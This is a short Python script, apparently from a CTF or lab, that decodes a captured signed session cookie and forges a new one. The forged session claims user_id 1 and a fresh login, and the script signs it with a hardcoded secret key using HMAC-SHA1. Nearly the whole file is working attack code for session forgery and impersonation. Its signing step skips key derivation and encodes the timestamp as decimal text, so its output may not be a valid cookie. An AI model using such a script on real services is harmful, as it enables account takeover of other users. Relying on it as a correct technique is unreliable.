import base64, json, hmac, hashlib, time

SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
captured = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

# Decode original
payload, ts, sig = captured.split('.')
pad = 4 - len(payload) % 4
if pad != 4: payload += '='*pad
original = json.loads(base64.urlsafe_b64decode(payload))
print('Original:', original)

# Forge new session
forged = {'_fresh':True,'_id':'a'*32,'user_id':1,'_user_id':1}
json_str = json.dumps(forged, separators=(',',':'))
new_payload = base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
new_ts = base64.urlsafe_b64encode(str(int(time.time())).encode()).rstrip(b'=').decode()
data = f'{new_payload}.{new_ts}'
signer = hmac.new(SECRET_KEY.encode(), data.encode(), hashlib.sha1)
new_sig = base64.urlsafe_b64encode(signer.digest()).rstrip(b'=').decode()
forged_cookie = f'{new_payload}.{new_ts}.{new_sig}'

print('Forged:', forged_cookie)

